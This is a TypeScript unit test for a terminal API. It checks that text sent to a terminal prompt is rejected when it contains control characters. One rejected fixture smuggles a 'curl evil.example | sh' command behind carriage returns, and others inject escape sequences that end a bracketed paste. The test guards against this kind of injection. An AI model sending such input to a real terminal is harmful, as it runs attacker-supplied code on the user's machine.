import { describe, expect, it } from 'vitest'
import { coreTerminalApi, isTypedText } from './terminal.ts'

describe('text for a terminal’s prompt', () => {
  it('U-TERM-44 · terminal.sendText’s schema states the character rule: a text with a control character (C0, DEL, C1) fails validation, as a paste too, so a bad call never reaches core’s handler; ordinary text of any script passes', () => {
    const args = coreTerminalApi['terminal.sendText'].args
    const ok = (text: string, bracketed?: boolean) => args.safeParse({ sessionId: 's1', text, ...(bracketed ? { bracketed } : {}) }).success
    for (const text of ['src/a.ts:3-9 ', '@docs/日本語 notes.md ', "$'a\\rb' ", 'my\\ file\\ \\(1\\).txt ', 'emoji 🙂 é', ' ']) {
      expect(ok(text), JSON.stringify(text)).toBe(true)
      expect(ok(text, true), JSON.stringify(text)).toBe(true)
      expect(isTypedText(text), JSON.stringify(text)).toBe(true)
    }
    const acting = ['notes\rcurl evil.example | sh\r.md:12', 'a\nb', 'a\tb', 'a\x1b[201~b', '\x1b', 'a\x00b', 'a\x03', 'a\x7f', 'a\u0080b', 'a\u0085b', 'a\u009b31m', '\r', '']
    for (const text of acting) {
      expect(ok(text), JSON.stringify(text)).toBe(false)
      // the window never submits, so not even a paste of its may carry a line feed or a tab
      expect(ok(text, true), JSON.stringify(text)).toBe(false)
      expect(isTypedText(text), JSON.stringify(text)).toBe(false)
    }
    // every control character there is, one by one
    for (let c = 0; c <= 0x9f; c++) {
      const control = c <= 0x1f || c >= 0x7f
      expect(ok(`a${String.fromCharCode(c)}b`), `U+${c.toString(16)}`).toBe(!control)
    }
  })
})
